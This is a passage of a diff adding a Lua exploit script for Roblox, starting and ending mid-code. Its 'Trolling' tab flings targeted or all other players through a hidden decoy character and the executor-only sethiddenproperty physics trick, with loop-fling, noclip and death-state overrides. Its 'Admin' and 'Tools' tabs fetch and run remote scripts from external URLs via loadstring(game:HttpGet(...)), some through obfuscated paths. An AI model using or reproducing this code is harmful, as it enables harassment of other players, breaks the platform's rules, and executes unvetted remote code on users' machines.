+                sethiddenproperty(mr, "PhysicsRepRootPart", mr)
+            end)
+        end
+    end
+
+    local function nanStopVoidSafety()
+        if voidSafetyConn then
+            voidSafetyConn:Disconnect()
+            voidSafetyConn = nil
+        end
+    end
+
+    local function nanGetCharAnims(char)
+        local animate = char:FindFirstChild("Animate")
+        if not animate then return {} end
+        local function ga(name)
+            local f = animate:FindFirstChild(name)
+            if f then
+                local a = f:FindFirstChildWhichIsA("Animation")
+                if a then return a.AnimationId end
+            end
+        end
+        return {Idle=ga("idle"), Walk=ga("walk"), Run=ga("run"), Jump=ga("jump"), Fall=ga("fall")}
+    end
+
+    local function nanStopFakeAnims()
+        for _, t in pairs(nanFakeAnimTracks) do
+            if t and t.IsPlaying then t:Stop(0.1) end
+        end
+    end
+
+    local function nanCleanupFakeChar()
+        if nanRenderConn        then nanRenderConn:Disconnect();        nanRenderConn        = nil end
+        if nanTransparencyConn  then nanTransparencyConn:Disconnect();  nanTransparencyConn  = nil end
+        if nanCamConn           then nanCamConn:Disconnect();           nanCamConn           = nil end
+        nanFakeAnimTracks = {}
+        if nanFakeChar then nanFakeChar:Destroy(); nanFakeChar = nil end
+        nanRealChar = nil
+    end
+
+    -- INTEGRATED: respects invisSystem state when restoring tracks
+    local function nanRestoreTracks(char)
+        if not char then return end
+        if invisSystem.isOn() then
+            -- Invisibility is active — don't restore normal tracks, just reapply invis emotes
+            invisSystem.reapply()
+            nanSavedTracks = {}
+            return
+        end
+        local as = char:FindFirstChild("Animate")
+        if as then as.Disabled = false end
+        for _, saved in pairs(nanSavedTracks) do
+            if saved.track and not saved.track.IsPlaying then
+                saved.track:Play()
+                saved.track:AdjustSpeed(saved.speed)
+                saved.track.TimePosition = saved.timePosition
+            end
+        end
+        nanSavedTracks = {}
+    end
+
+    local function nanTeleportToFake(onDone)
+        local cf = nil
+        if nanFakeChar then
+            local fr = nanFakeChar:FindFirstChild("HumanoidRootPart")
+            if fr then cf = fr.CFrame end
+        end
+        if not cf then cf = nanLastFakeCFrame end
+        if not cf then if onDone then onDone() end; return end
+
+        local mc = weldLocal.Character
+        if mc then
+            local hum = mc:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.PlatformStand = false
+                hum.Sit = false
+                hum:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, false)
+                hum:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, true)
+                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+            end
+            for _, part in ipairs(mc:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.AssemblyLinearVelocity  = Vector3.zero
+                    part.AssemblyAngularVelocity = Vector3.zero
+                end
+            end
+        end
+
+        local frameCount = 0
+        local teleConn
+        teleConn = RunService.Heartbeat:Connect(function()
+            frameCount += 1
+            local mc2 = weldLocal.Character
+            local mr = mc2 and mc2:FindFirstChild("HumanoidRootPart")
+            local hum = mc2 and mc2:FindFirstChildOfClass("Humanoid")
+            if hum and hum.PlatformStand then
+                hum.PlatformStand = false
+                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+            end
+            if mr then
+                mr.CFrame = cf
+                mr.AssemblyLinearVelocity  = Vector3.zero
+                mr.AssemblyAngularVelocity = Vector3.zero
+            end
+            if frameCount >= 10 then
+                teleConn:Disconnect()
+                if onDone then onDone() end
+            end
+        end)
+    end
+
+    local function nanDestroyFakeChar()
+        if nanCamConn then nanCamConn:Disconnect(); nanCamConn = nil end
+        local camera = workspace.CurrentCamera
+
+        -- patch C: only restore the saved subject if it's still alive (has a Parent).
+        -- A dead/destroyed humanoid has Parent = nil, and setting CameraSubject to it
+        -- detaches the camera — that's what causes "camera into the void" after a fling
+        -- that killed and respawned the character.
+        if nanSavedCamSubject and nanSavedCamSubject.Parent then
+            camera.CameraSubject = nanSavedCamSubject
+        else
+            local rc = weldLocal.Character
+            local rh = rc and rc:FindFirstChildOfClass("Humanoid")
+            if rh then camera.CameraSubject = rh end
+        end
+        nanSavedCamSubject = nil
+
+        if nanFakeChar and nanRealChar then
+            local fr = nanFakeChar:FindFirstChild("HumanoidRootPart")
+            local rr = nanRealChar:FindFirstChild("HumanoidRootPart")
+            if fr and rr then rr.CFrame = fr.CFrame end
+        end
+        nanRestoreTracks(nanRealChar)
+        nanCleanupFakeChar()
+    end
+
+    local function nanSpawnFakeChar()
+        local char = weldLocal.Character
+        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+        nanRealChar = char; char.Archivable = true
+        nanFakeChar = char:Clone()
+        nanFakeChar.Name = "NanClone"
+        nanFakeChar.Parent = workspace
+        local fakeHum  = nanFakeChar:FindFirstChild("Humanoid")
+        local fakeRoot = nanFakeChar:FindFirstChild("HumanoidRootPart")
+        if not fakeHum or not fakeRoot then return end
+        for _, v in pairs(nanFakeChar:GetDescendants()) do
+            if v:IsA("LocalScript") or v:IsA("Script") then
+                v:Destroy()
+            elseif v:IsA("BasePart") then
+                v.Anchored   = false
+                v.CanCollide = (v.Name == "HumanoidRootPart")
+                if v.Name == "HumanoidRootPart" then v.Transparency = 1 end
+            end
+        end
+        local ca = nanFakeChar:FindFirstChild("Animate")
+        if ca then ca.Disabled = true end
+        local rr = char:FindFirstChild("HumanoidRootPart")
+        if rr then fakeRoot.CFrame = rr.CFrame end
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            nanSavedTracks = {}
+            for _, t in pairs(hum:GetPlayingAnimationTracks()) do
+                table.insert(nanSavedTracks, {track=t, speed=t.Speed, timePosition=t.TimePosition})
+                t:Stop()
+            end
+            local as = char:FindFirstChild("Animate")
+            if as then as.Disabled = true end
+        end
+        -- INTEGRATED: if invisibility is on, don't save normal tracks for later restoration
+        if invisSystem.isOn() then
+            nanSavedTracks = {}
+        end
+        local charAnims = nanGetCharAnims(char)
+        local function LA(id)
+            if not id then return nil end
+            local a = Instance.new("Animation"); a.AnimationId = id
+            return fakeHum:LoadAnimation(a)
+        end
+        nanFakeAnimTracks.Idle = LA(charAnims.Idle)
+        nanFakeAnimTracks.Walk = LA(charAnims.Walk)
+        nanFakeAnimTracks.Run  = LA(charAnims.Run)
+        nanFakeAnimTracks.Jump = LA(charAnims.Jump)
+        nanFakeAnimTracks.Fall = LA(charAnims.Fall)
+        if nanFakeAnimTracks.Idle then nanFakeAnimTracks.Idle:Play() end
+        local camera = workspace.CurrentCamera
+        nanSavedCamSubject   = camera.CameraSubject
+        camera.CameraSubject = fakeHum
+        local camOverrideAllowed = true
+        nanCamConn = camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
+            if not nanFakeChar or not camOverrideAllowed then return end
+            local fh = nanFakeChar:FindFirstChild("Humanoid")
+            if not fh then return end
+            local newSubject = camera.CameraSubject
+            if newSubject == fh then return end
+            camOverrideAllowed = false
+            task.delay(0.1, function()
+                camOverrideAllowed = true
+                if not nanFakeChar then return end
+                local fh2 = nanFakeChar:FindFirstChild("Humanoid")
+                if fh2 then camera.CameraSubject = fh2 end
+            end)
+        end)
+        fakeHum.StateChanged:Connect(function(_, ns)
+            if ns == Enum.HumanoidStateType.Jumping then
+                nanStopFakeAnims(); if nanFakeAnimTracks.Jump then nanFakeAnimTracks.Jump:Play() end
+            elseif ns == Enum.HumanoidStateType.Freefall then
+                nanStopFakeAnims(); if nanFakeAnimTracks.Fall then nanFakeAnimTracks.Fall:Play() end
+            elseif ns == Enum.HumanoidStateType.Landed then
+                nanStopFakeAnims(); if nanFakeAnimTracks.Idle then nanFakeAnimTracks.Idle:Play() end
+            end
+        end)
+        nanTransparencyConn = RunService.RenderStepped:Connect(function()
+            if not nanFakeChar then return end
+            local cam = workspace.CurrentCamera
+            local fh  = nanFakeChar:FindFirstChild("Head")
+            local inFP = fh and cam and (cam.CFrame.Position - fh.Position).Magnitude < 2.5
+            for _, part in pairs(nanFakeChar:GetDescendants()) do
+                if (part:IsA("BasePart") or part:IsA("MeshPart")) and part.Name ~= "HumanoidRootPart" then
+                    part.LocalTransparencyModifier = inFP and 1 or 0
+                end
+            end
+        end)
+        nanRenderConn = RunService.RenderStepped:Connect(function()
+            if not nanFakeChar or not fakeHum or not fakeRoot then return end
+            local UIS = game:GetService("UserInputService")
+            local iv  = Vector3.zero
+            if nanControls then
+                iv = nanControls:GetMoveVector()
+            else
+                if UIS:IsKeyDown(Enum.KeyCode.W) then iv += Vector3.new(0,0,-1) end
+                if UIS:IsKeyDown(Enum.KeyCode.S) then iv += Vector3.new(0,0,1) end
+                if UIS:IsKeyDown(Enum.KeyCode.A) then iv += Vector3.new(-1,0,0) end
+                if UIS:IsKeyDown(Enum.KeyCode.D) then iv += Vector3.new(1,0,0) end
+            end
+            local cs = fakeHum:GetState()
+            if UIS:IsKeyDown(Enum.KeyCode.Space) and cs ~= Enum.HumanoidStateType.Jumping and cs ~= Enum.HumanoidStateType.Freefall then
+                fakeHum.Jump = true
+            end
+            local camCF = workspace.CurrentCamera.CFrame
+            local fd = (camCF.RightVector * iv.X) + (camCF.LookVector * -iv.Z)
+            fd = Vector3.new(fd.X, 0, fd.Z)
+            local grounded = cs == Enum.HumanoidStateType.Running or cs == Enum.HumanoidStateType.RunningNoPhysics
+            if fd.Magnitude > 0.01 then
+                fakeHum:Move(fd.Unit, false)
+                if grounded and nanFakeAnimTracks.Run and not nanFakeAnimTracks.Run.IsPlaying then
+                    nanStopFakeAnims(); nanFakeAnimTracks.Run:Play(0.1)
+                end
+            else
+                fakeHum:Move(Vector3.zero, false)
+                if grounded and nanFakeAnimTracks.Idle and not nanFakeAnimTracks.Idle.IsPlaying then
+                    nanStopFakeAnims(); nanFakeAnimTracks.Idle:Play(0.1)
+                end
+            end
+            if fakeRoot then nanLastFakeCFrame = fakeRoot.CFrame end
+        end)
+        -- INTEGRATED: if invisibility is active, reapply its emotes right now so they
+        -- play for the entire duration of the fling, not just after it finishes.
+        if invisSystem.isOn() then
+            invisSystem.reapply()
+        end
+    end
+
+    local function nanSetupNoCollide()
+        if not nanFakeChar then return end
+        local myChar = weldLocal.Character
+        if not myChar then return end
+        for _, fakePart in ipairs(nanFakeChar:GetDescendants()) do
+            if fakePart:IsA("BasePart") then
+                for _, realPart in ipairs(myChar:GetDescendants()) do
+                    if realPart:IsA("BasePart") then
+                        local noCollide = Instance.new("NoCollisionConstraint")
+                        noCollide.Part0 = fakePart
+                        noCollide.Part1 = realPart
+                        noCollide.Parent = fakePart
+                    end
+                end
+            end
+        end
+    end
+
+    local function nanDisableCollideWithWorld()
+        local myChar = weldLocal.Character
+        if not myChar then return end
+        for _, part in ipairs(myChar:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    end
+
+    local function nanRestoreCollide()
+        local myChar = weldLocal.Character
+        if not myChar then return end
+        for _, part in ipairs(myChar:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = (part.Name == "HumanoidRootPart")
+            end
+        end
+    end
+
+    TabTrolling:AddButton({
+        Label    = "Fling",
+        Callback = function()
+            if nanTarget == "" then return end
+            local targets = {}
+            if nanTarget == "-" then
+                for _, plr in ipairs(weldPlayers:GetPlayers()) do
+                    if plr ~= weldLocal then table.insert(targets, plr) end
+                end
+            else
+                for _, plr in ipairs(weldPlayers:GetPlayers()) do
+                    if plr ~= weldLocal
+                    and (plr.Name:lower():find(nanTarget:lower())
+                         or (plr.DisplayName and plr.DisplayName:lower():find(nanTarget:lower()))) then
+                        table.insert(targets, plr); break
+                    end
+                end
+            end
+
+            if nanFakeChar then
+                local fr = nanFakeChar:FindFirstChild("HumanoidRootPart")
+                if fr then nanLastFakeCFrame = fr.CFrame end
+            end
+            if not nanFakeChar then
+                nanSpawnFakeChar()
+                nanSetupNoCollide()
+            end
+
+            -- PHASE 1: move to offset1 and hold there (positioning only, no power).
+            local function doHold(target)
+                local holdConn
+                holdConn = weldRun.Heartbeat:Connect(function()
+                    local myChar = weldLocal.Character
+                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                    local tgtChar = target.Character
+                    local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+                    if not myChar or not myRoot or not tgtChar or not tgtRoot then return end
+                    pcall(function()
+                        nanDisableCollideWithWorld()
+                        local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
+                        myRoot.CFrame = CFrame.new(tgtRoot.Position)
+                            * CFrame.Angles(0, tgtYaw, 0)
+                            * nanFlingOffset1
+                            * nanRotCFrame(nanFlingRotation)
+                        myRoot.AssemblyLinearVelocity  = Vector3.zero
+                        myRoot.AssemblyAngularVelocity = Vector3.zero
+                    end)
+                end)
+                task.wait(nanFlingWait1)
+                holdConn:Disconnect()
+            end
+
+            -- PHASE 2: move to offset and apply the actual fling power.
+            local function doFling(target)
+                local flingConn
+                activeFlingCount = activeFlingCount + 1
+                flingConn = weldRun.Heartbeat:Connect(function()
+                    local myChar = weldLocal.Character
+                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                    local tgtChar = target.Character
+                    local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+                    if not myChar or not myRoot or not tgtChar or not tgtRoot then return end
+                    pcall(function()
+                        nanDisableCollideWithWorld()
+                        local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
+                        myRoot.CFrame = CFrame.new(tgtRoot.Position)
+                            * CFrame.Angles(0, tgtYaw, 0)
+                            * nanFlingOffset
+                            * nanRotCFrame(nanFlingRotation)
+                        myRoot.Velocity    = nanFlingPower
+                        myRoot.RotVelocity = nanFlingPower
+                        sethiddenproperty(myRoot, "PhysicsRepRootPart", tgtRoot)
+                    end)
+                end)
+                task.wait(nanFlingWait)
+                flingConn:Disconnect()
+                activeFlingCount = math.max(0, activeFlingCount - 1)
+            end
+
+            local function returnToFake()
+                nanRestoreCollide()
+                nanResetPhysicsRep()
+                local mc = weldLocal.Character
+                if mc then
+                    local hum = mc:FindFirstChildOfClass("Humanoid")
+                    if hum then
+                        hum.PlatformStand = false
+                        hum.Sit = false
+                        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+                    end
+                    for _, part in ipairs(mc:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.AssemblyLinearVelocity  = Vector3.zero
+                            part.AssemblyAngularVelocity = Vector3.zero
+                        end
+                    end
+                end
+                local done = false
+                nanTeleportToFake(function() done = true end)
+                local waited = 0
+                while not done and waited < 2 do
+                    task.wait(0.05); waited += 0.05
+                end
+                nanDestroyFakeChar()
+                nanLastFakeCFrame = nil
+            end
+
+            nanStartVoidSafety()
+            for _, target in ipairs(targets) do
+                doHold(target)
+                doFling(target)
+                task.wait(0.3)
+            end
+
+            returnToFake()
+            nanStopVoidSafety()
+        end,
+    })
+
+    do
+        local caEnabled  = false
+        local caLoopTask = nil
+
+        local function caCleanupAndReturn()
+            nanRestoreCollide()
+            nanResetPhysicsRep()
+            local mc = weldLocal.Character
+            if mc then
+                local hum = mc:FindFirstChildOfClass("Humanoid")
+                if hum then
+                    hum.PlatformStand = false
+                    hum.Sit = false
+                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+                end
+                for _, part in ipairs(mc:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.AssemblyLinearVelocity  = Vector3.zero
+                        part.AssemblyAngularVelocity = Vector3.zero
+                    end
+                end
+            end
+            if nanFakeChar then
+                local fr = nanFakeChar:FindFirstChild("HumanoidRootPart")
+                if fr then nanLastFakeCFrame = fr.CFrame end
+            end
+            local done = false
+            nanTeleportToFake(function() done = true end)
+            local waited = 0
+            while not done and waited < 2 do
+                task.wait(0.05); waited += 0.05
+            end
+            nanDestroyFakeChar()
+            nanLastFakeCFrame = nil
+        end
+
+        local function caGetTargets()
+            local targets = {}
+            if nanTarget == "" then return targets end
+            if nanTarget == "-" then
+                for _, plr in ipairs(weldPlayers:GetPlayers()) do
+                    if plr ~= weldLocal then table.insert(targets, plr) end
+                end
+            else
+                for _, plr in ipairs(weldPlayers:GetPlayers()) do
+                    if plr ~= weldLocal
+                    and (plr.Name:lower():find(nanTarget:lower())
+                         or (plr.DisplayName and plr.DisplayName:lower():find(nanTarget:lower()))) then
+                        table.insert(targets, plr); break
+                    end
+                end
+            end
+            return targets
+        end
+
+        local function caIsTouchingPart(char)
+            if not char then return false end
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if not hum then return false end
+            local state = hum:GetState()
+            return state == Enum.HumanoidStateType.Running
+                or state == Enum.HumanoidStateType.RunningNoPhysics
+                or state == Enum.HumanoidStateType.Climbing
+                or state == Enum.HumanoidStateType.Swimming
+                or state == Enum.HumanoidStateType.Seated
+        end
+
+        local function caGetValidTargets()
+            local valid = {}
+            for _, plr in ipairs(caGetTargets()) do
+                local tc = plr.Character
+                local tr = tc and tc:FindFirstChild("HumanoidRootPart")
+                if not tr then continue end
+                if caIsTouchingPart(tc) then
+                    table.insert(valid, plr)
+                end
+            end
+            return valid
+        end
+
+        -- PHASE 1: move to offset1 and hold there (positioning only, no power).
+        local function doHold(target)
+            if not caEnabled then return end
+            local holdConn
+            holdConn = weldRun.Heartbeat:Connect(function()
+                if not caEnabled then
+                    holdConn:Disconnect()
+                    return
+                end
+                local myChar = weldLocal.Character
+                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                local tgtChar = target.Character
+                local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+                if not myChar or not myRoot or not tgtChar or not tgtRoot then return end
+                pcall(function()
+                    nanDisableCollideWithWorld()
+                    local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
+                    myRoot.CFrame = CFrame.new(tgtRoot.Position)
+                        * CFrame.Angles(0, tgtYaw, 0)
+                        * nanFlingOffset1
+                        * nanRotCFrame(nanFlingRotation)
+                    myRoot.AssemblyLinearVelocity  = Vector3.zero
+                    myRoot.AssemblyAngularVelocity = Vector3.zero
+                end)
+            end)
+            task.wait(nanFlingWait1)
+            holdConn:Disconnect()
+        end
+
+        -- PHASE 2: move to offset and apply the actual fling power.
+        local function doFling(target)
+            if not caEnabled then return end
+            local flingConn
+            activeFlingCount = activeFlingCount + 1
+            flingConn = weldRun.Heartbeat:Connect(function()
+                if not caEnabled then
+                    flingConn:Disconnect()
+                    activeFlingCount = math.max(0, activeFlingCount - 1)
+                    return
+                end
+                local myChar = weldLocal.Character
+                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                local tgtChar = target.Character
+                local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+                if not myChar or not myRoot or not tgtChar or not tgtRoot then return end
+                pcall(function()
+                    nanDisableCollideWithWorld()
+                    local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
+                    myRoot.CFrame = CFrame.new(tgtRoot.Position)
+                        * CFrame.Angles(0, tgtYaw, 0)
+                        * nanFlingOffset
+                        * nanRotCFrame(nanFlingRotation)
+                    myRoot.Velocity    = nanFlingPower
+                    myRoot.RotVelocity = nanFlingPower
+                    sethiddenproperty(myRoot, "PhysicsRepRootPart", tgtRoot)
+                end)
+            end)
+            task.wait(nanFlingWait)
+            flingConn:Disconnect()
+            activeFlingCount = math.max(0, activeFlingCount - 1)
+        end
+
+        TabTrolling:AddToggle({
+            Label    = "Loop Fling",
+            Default  = false,
+            Callback = function(state)
+                caEnabled = state
+                if not caEnabled then
+                    nanStopVoidSafety()
+                    if caLoopTask then task.cancel(caLoopTask); caLoopTask = nil end
+                    caCleanupAndReturn()
+                    return
+                end
+
+                nanStopVoidSafety()
+                caLoopTask = task.spawn(function()
+                    while caEnabled do
+                        if nanTarget == "" then task.wait(0.1); continue end
+
+                        local valid = caGetValidTargets()
+                        if #valid == 0 then task.wait(0.1); continue end
+
+                        local target = valid[math.random(1, #valid)]
+
+                        if nanFakeChar then
+                            local fr = nanFakeChar:FindFirstChild("HumanoidRootPart")
+                            if fr then nanLastFakeCFrame = fr.CFrame end
+                        end
+                        if not nanFakeChar then
+                            nanSpawnFakeChar()
+                            nanSetupNoCollide()
+                        end
+
+                        doHold(target)
+
+                        if not caEnabled then break end
+
+                        doFling(target)
+
+                        if not caEnabled then break end
+
+                        nanRestoreCollide()
+                        nanResetPhysicsRep()
+                        local mc = weldLocal.Character
+                        if mc then
+                            local hum = mc:FindFirstChildOfClass("Humanoid")
+                            if hum then
+                                hum.PlatformStand = false
+                                hum.Sit = false
+                                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+                            end
+                            for _, part in ipairs(mc:GetDescendants()) do
+                                if part:IsA("BasePart") then
+                                    part.AssemblyLinearVelocity  = Vector3.zero
+                                    part.AssemblyAngularVelocity = Vector3.zero
+                                end
+                            end
+                        end
+
+                        local done = false
+                        nanTeleportToFake(function() done = true end)
+                        local waited = 0
+                        while not done and waited < 2 do
+                            task.wait(0.05); waited += 0.05
+                        end
+                        nanDestroyFakeChar()
+                        nanLastFakeCFrame = nil
+                    end
+                end)
+            end,
+        })
+    end
+end
+setupNanSystem()
+
+TabTrolling:AddButton({
+        Label    = "Anti-Bang",
+        Callback = function()
+local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+workspace.FallenPartsDestroyHeight = -1000
+local lastCFrame = hrp.CFrame
+
+hrp.CFrame = CFrame.new(Vector3.new(0, -500, 0))
+
+wait(0.7)
+
+hrp.CFrame = lastCFrame
+workspace.FallenPartsDestroyHeight = -500
+end,
+    })
+
+do
+    local lplayer  = weldPlayers.LocalPlayer
+    local hbConn   = nil
+    local rdConn   = nil
+    local stConn   = nil
+    local lockedY  = nil
+    local isLocked = false
+    local oldV     = Vector3.zero
+
+    local function stopAll()
+        if hbConn then hbConn:Disconnect(); hbConn = nil end
+        if rdConn then rdConn:Disconnect(); rdConn = nil end
+        if stConn then stConn:Disconnect(); stConn = nil end
+    end
+
+    local function setNoclip(char, state)
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then part.CanCollide = not state end
+        end
+    end
+
+    local function applyStateOverrides(char)
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum then return end
+        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+        hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+        hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
+    end
+
+    local function removeStateOverrides(char)
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum then return end
+        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+        hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
+        hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
+    end
+
+    TabTrolling:AddToggle({
+        Label   = "Trampoline",
+        Default = false,
+        Callback = function(value)
+            local char = lplayer.Character
+            if not char then return end
+            local root = char:FindFirstChild("HumanoidRootPart")
+            if not root then return end
+            if value then
+                applyStateOverrides(char)
+                setNoclip(char, true)
+                lockedY  = root.Position.Y - 5
+                isLocked = true
+                root.CFrame = CFrame.new(root.Position.X, lockedY, root.Position.Z)
+                root.AssemblyLinearVelocity  = Vector3.zero
+                root.AssemblyAngularVelocity = Vector3.zero
+                hbConn = RunService.Heartbeat:Connect(function()
+                    if not root or not root.Parent then stopAll(); return end
+                    for _, part in ipairs(char:GetDescendants()) do
+                        if part:IsA("BasePart") then part.CanCollide = false end
+                    end
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    if hum then
+                        local anim = hum:FindFirstChildOfClass("Animator")
+                        if anim then
+                            for _, t in ipairs(anim:GetPlayingAnimationTracks()) do t:Stop(0) end
+                        end
+                    end
+                    if isLocked and lockedY ~= nil then
+                        local pos = root.Position
+                        if math.abs(pos.Y - lockedY) > 0.01 then
+                            root.CFrame = CFrame.new(pos.X, lockedY, pos.Z)
+                        end
+                        local v = root.AssemblyLinearVelocity
+                        root.AssemblyLinearVelocity = Vector3.new(v.X, 0, v.Z)
+                    end
+                    oldV = root.AssemblyLinearVelocity
+                    root.AssemblyLinearVelocity = oldV * 0 + Vector3.new(0, -9e9, 0)
+                end)
+                rdConn = RunService.RenderStepped:Connect(function()
+                    if not root or not root.Parent then return end
+                    root.AssemblyLinearVelocity = oldV
+                end)
+                stConn = RunService.Stepped:Connect(function()
+                    if not root or not root.Parent then return end
+                    root.AssemblyLinearVelocity = oldV + Vector3.new(0, 0.1, 0)
+                end)
+            else
+                isLocked = false; lockedY = nil
+                stopAll()
+                setNoclip(char, false)
+                removeStateOverrides(char)
+                root.CFrame = CFrame.new(root.Position)
+            end
+        end,
+    })
+end
+
+
+
+local Tab = Window:AddTab("Admin")
+
+
+Tab:AddButton({
+        Label    = "Novoline Admin",
+        Callback = function() loadstring(game:HttpGet("https://novoline.pro"))() end,
+    })
+
+
+Tab:AddButton({
+        Label    = "Nameless Admin",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FD2Team/Nameless-Admin-No-Byfron-Kick/main/Source"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Infinite Yield",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "OP Admin",
+        Callback = function() local options = { -- change false to true for binds autosaving
+    binds_autosave = false
+}
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/addihallstar/opadminsupreme/refs/heads/main/opadmin_new.lua'))(options) end,
+    })
+
+
+local Tab = Window:AddTab("Tools")
+
+
+Tab:AddButton({
+        Label    = "Emergency Kick",
+        Callback = function()
+        local Players = game:GetService("Players")
+        local localPlayer = Players.LocalPlayer
+        
+        localPlayer:Kick("You have been kicked using the emergency kick.")
+        end,
+    })
+
+Tab:AddButton({
+        Label    = "Chat Command Line",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A2%F0%9D%97%81%F0%9D%96%BA%F0%9D%97%8D%20%F0%9D%96%A2%F0%9D%97%88%F0%9D%97%86%F0%9D%97%86%F0%9D%96%BA%F0%9D%97%87%F0%9D%96%BD%20%F0%9D%96%AB%F0%9D%97%82%F0%9D%97%87%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Animation Asset Printer",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A0%F0%9D%97%87%F0%9D%97%82%F0%9D%97%86%F0%9D%96%BA%F0%9D%97%8D%F0%9D%97%82%F0%9D%97%88%F0%9D%97%87%20%F0%9D%96%A0%F0%9D%97%8C%F0%9D%97%8C%F0%9D%96%BE%F0%9D%97%8D%20%F0%9D%96%A8%F0%9D%96%A3%20%F0%9D%96%AF%F0%9D%97%8B%F0%9D%97%82%F0%9D%97%87%F0%9D%97%8D%F0%9D%96%BE%F0%9D%97%8B"))() end,
+    })
+
+
+Tab:AddButton({
+        Label    = "HumanoidRootPart Debug",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A7%F0%9D%97%8E%F0%9D%97%86%F0%9D%96%BA%F0%9D%97%87%F0%9D%97%88%F0%9D%97%82%F0%9D%96%BD%F0%9D%96%B1%F0%9D%97%88%F0%9D%97%88%F0%9D%97%8D%F0%9D%96%AF%F0%9D%96%BA%F0%9D%97%8B%F0%9D%97%8D"))() end,
+    })
+
+
+Tab:AddButton({
+        Label    = "Head Debug",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A7%F0%9D%96%BE%F0%9D%96%BA%F0%9D%96%BD%20%F0%9D%96%A3%F0%9D%96%BE%F0%9D%96%BB%F0%9D%97%8E%F0%9D%97%80"))() end,
+    })
+
+
+Tab:AddButton({
+        Label    = "Remote Spy",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B1%F0%9D%96%BE%F0%9D%97%86%F0%9D%97%88%F0%9D%97%8D%F0%9D%96%BE%20%F0%9D%96%B2%F0%9D%97%89%F0%9D%97%92"))() end,
+    })
+
+
+
+Tab:AddButton({
+        Label    = "Server Finder",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/MaxproGlitcher/Server-Finder-Deluxe/refs/heads/main/Finder_Servers_Code.luau"))() end,
+    })
+
+
+
+Tab:AddButton({
+        Label    = "Boost FPS",
+        Callback = function() 
+-- FPS Booster by Fox
+-- lighting
+
+local Config = {
+    DisableShadows       = true,
+    DisableLightingFX    = true,
+    DisableAtmosphere    = true,
+    DisableParticles     = true,
+    FlattenTextures      = true,
+    DisableTerrain       = true,
+    LowQualityGraphics   = true,
+    StripAccessories     = true,
+    StripLayeredClothing = true,
+    ForceNight           = true,
+    FPSCap               = false,
+}
+
+local Lighting    = game:GetService("Lighting")
+local RunService  = game:GetService("RunService")
+local Players     = game:GetService("Players")
+local Workspace   = game:GetService("Workspace")
+local localPlayer = Players.LocalPlayer
+
+-- ──────────────────────────────────────────
+-- 1. GRAPHICS QUALITY
+-- ──────────────────────────────────────────
+if Config.LowQualityGraphics then
+    settings().Rendering.QualityLevel        = Enum.QualityLevel.Level01
+    settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
+    settings().Rendering.EagerBulkExecution  = false
+    settings().Rendering.EnableFRM           = false
+end
+
+-- ──────────────────────────────────────────
+-- 2. SHADOWS
+-- ──────────────────────────────────────────
+if Config.DisableShadows then
+    Lighting.GlobalShadows = false
+    Lighting.Technology    = Enum.Technology.Compatibility
